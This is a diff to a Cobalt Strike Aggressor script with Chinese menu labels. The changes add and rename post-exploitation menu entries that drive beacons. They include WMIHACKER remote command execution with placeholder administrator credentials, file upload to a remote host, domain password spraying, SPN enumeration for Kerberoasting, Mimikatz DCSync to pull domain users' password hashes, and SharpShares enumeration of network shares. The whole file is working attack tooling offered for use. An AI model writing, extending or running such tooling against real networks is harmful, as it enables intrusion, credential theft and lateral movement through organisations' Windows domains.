@@ -27,7 +27,7 @@ sub internal_monologue{
 	bexecute_assembly($1, $binary, $args);
 }	
 
-			item "SharpOXID-Find" {
+			item "探测多网卡主机" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
 			dialog_description($dialog, "OXID 解析器，用于探测多网口机器（依赖于 135 端口）,-i扫描指定ip,-c扫描C段。");
@@ -153,6 +153,28 @@ sub WMIHACKER_cmd{
 	bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
 } 
 
+            item "shell"{
+                $bid = $1['@'];
+                $Dialog = dialog("WMIHACKER_shell",%(host => "127.0.0.1", user => "administrator", pass => "password", command => "systeminfo", GETRES => "1 or 0",bid => $bid),&WMIHACKER_cmd);
+                dialog_description($Dialog, "");
+                drow_text($Dialog, "host", "host: ");
+				drow_text($Dialog, "user", "user: ");
+				drow_text($Dialog, "pass", "pass: ");
+				drow_text($Dialog, "command", "command: ");
+				drow_text($Dialog, "GETRES", "GETRES: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+                }
+sub WMIHACKER_cmd{
+    local('$host $user $pass $command $GETRES');
+    $host = $3['host'];
+	$user = $3['user'];
+	$pass = $3['pass'];
+	$command = $3['command'];
+	$GETRES = $3['GETRES'];
+	bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
+}
+
             item "upload"{
                 $bid = $1['@'];
                 $Dialog = dialog("WMIHACKER_upload",%(host => "127.0.0.1", user => "administrator", pass => "password", localpath => "c:\\windows\\system32\\calc.exe", remotepath => "C:\\\$Recycle.Bin",bid => $bid),&WMIHACKER_upload);
@@ -200,7 +222,7 @@ sub WMIHACKER_download{
 
 
 		}
-			item "SharpDomainSpray" {
+			item "枚举域用户密码" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
 			dialog_description($dialog, "枚举域内用户密码（Pass2User指定单个密码-枚举，User2Pass指定单个用户-爆破）。");
@@ -211,14 +233,14 @@ sub WMIHACKER_download{
         }
 sub SharpDomainSpray {
 	$arg = join(' ', @($3['type'],$3['content']));
-	bexecute_assembly($bid, script_resource("/script/SharpDomainSpray.exe"), $arg);
+	bexecute_assembly($bid, script_resource("/script/SharpDomainSpray/SharpDomainSpray.exe"), $arg);
 } 
 
 		item "获取SPN" {
 			bexecute_assembly($1, script_resource("/script/SPNSearcher.exe"), "");
 		}
 
-		 menu "Mimikatz-DCSync" {
+		 menu "获取域用户hash" {
 		 		item "指定用户" {
 		 			$dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "域名" , user => "用户") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
 		 			dialog_description($dialog,"使用Mimikatz去获取指定用户的密码Hash");
@@ -237,6 +259,19 @@ sub SharpDomainSpray {
 
 		 		}
 		 }
+
+			item "获取域共享" {
+			$bid = $1['@'];
+			$dialog = dialog("获取域共享", %(bid => $bid), &SharpShares);
+			dialog_description($dialog, "列出当前域中所有计算机的网络共享信息,也可以将所有计算机名称转换为IP地址。");
+			drow_combobox($dialog, "type", "type:", @("ips","shares"));		
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpShares {
+	$arg = join(' ',  @($3['type']));
+	bexecute_assembly($bid, script_resource("/script/SharpShares.exe"), $arg);
+}
 		
 		
 		}
